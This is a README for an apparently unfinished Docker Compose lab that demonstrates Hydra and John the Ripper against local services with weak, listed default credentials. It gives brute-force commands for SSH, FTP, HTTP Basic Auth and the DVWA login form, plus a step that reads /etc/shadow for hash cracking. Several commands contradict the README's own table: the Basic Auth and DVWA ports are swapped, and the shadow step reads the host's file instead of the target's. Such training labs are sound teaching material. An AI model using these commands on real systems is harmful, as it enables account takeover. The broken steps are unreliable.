# hacking-lab-demo

A Docker Compose lab for demonstrating John the Ripper and Hydra against services with different authentication methods.

## Prerequisites

- Docker and Docker Compose

## Quick Start

```bash
docker compose up -d
```

## Services

| Service | Protocol | Internal Hostname | Internal Port | Host Port | Credentials |
|---|---|---|---|---|---|
| SSH | SSH | `ssh-target` | 2222 | 2222 | `admin` / `password123` |
| FTP | FTP | `ftp-target` | 21 | 21 | `ftpuser` / `letmein` |
| HTTP Basic Auth | HTTP | `http-basic` | 80 | 8080 | `webadmin` / `dragon` |
| DVWA (Form Login) | HTTP | `dvwa` | 80 | 8081 | `admin` / `password` |

## Accessing Services

- **SSH:** `ssh admin@localhost -p 2222`
- **FTP:** `ftp localhost 21`
- **HTTP Basic Auth:** open <http://localhost:8080> in a browser
- **DVWA:** open <http://localhost:8081> in a browser

## Demo Examples

### Hydra – Brute-force SSH

**TODO**
```bash
hydra -l admin -P rockyou.txt.gz ssh://127.0.0.1:2222
```

### Hydra – Brute-force FTP

**TODO**
```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt.gz ftp://127.0.0.1
```

### Hydra – Brute-force HTTP Basic Auth

**TODO**
```bash
hydra -l webadmin -P /usr/share/wordlists/rockyou.txt.gz 127.0.0.1:8081 http-get /
```

### Hydra – Brute-force DVWA Login Form

First log in to DVWA at <http://localhost:8081> and click **Create / Reset Database**, then:

**TODO**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz \
  127.0.0.1:8080 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<session_id>;security=low"
```

> Replace `<session_id>` with a valid PHPSESSID from your browser.

### John the Ripper – Crack password hashes

Extract the shadow file from the SSH target and crack it:

**TODO**
```bash
# From the host
cat /etc/shadow > /tmp/shadow.txt

# Inside the attacker container
john /tmp/shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz
john /tmp/shadow.txt --show
```

## Cleanup

```bash
docker compose down -v
```